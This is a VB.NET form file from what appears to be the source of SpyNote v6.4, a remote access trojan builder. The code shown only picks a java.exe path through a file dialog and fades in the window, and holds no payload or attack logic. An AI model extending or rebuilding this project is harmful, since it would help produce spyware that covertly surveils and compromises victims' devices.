Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports SpyNote_V6._4.SN.SpyNote.Stores

Public Class JV
    Private Sub JV_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\16.ico"))
        Me.aFileName.HTBTB.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub
    Private Sub ThemeButton1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton1.Click
        Dim fileBox As FileBox = New FileBox() With
        {
            .strGetFiles = "*.exe*",
            .Text = "Selcted Files"
        }
        fileBox.ThemeTextBox1.Visible = False
        fileBox.Label1.Visible = False
        If (fileBox.ShowDialog() <> System.Windows.Forms.DialogResult.OK) Then
            fileBox.Close()
        ElseIf (fileBox.BoxView1.SelectedRows.Count > 0) Then
            For i As Integer = fileBox.BoxView1.SelectedRows.Count - 1 To 0 Step -1
                Dim str As String = Conversions.ToString(Operators.ConcatenateObject(String.Concat(fileBox.TEXTPATH.Text, "\"), fileBox.BoxView1.SelectedRows(i).Cells(1).Value))
                If (File.Exists(str)) Then
                    If (Operators.CompareString((New FileInfo(str)).Name, "java.exe", False) = 0) Then
                        Me.aFileName.Text = str
                        MyBase.DialogResult = System.Windows.Forms.DialogResult.OK
                    End If
                End If
            Next

        End If
        fileBox.Close()
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

End Class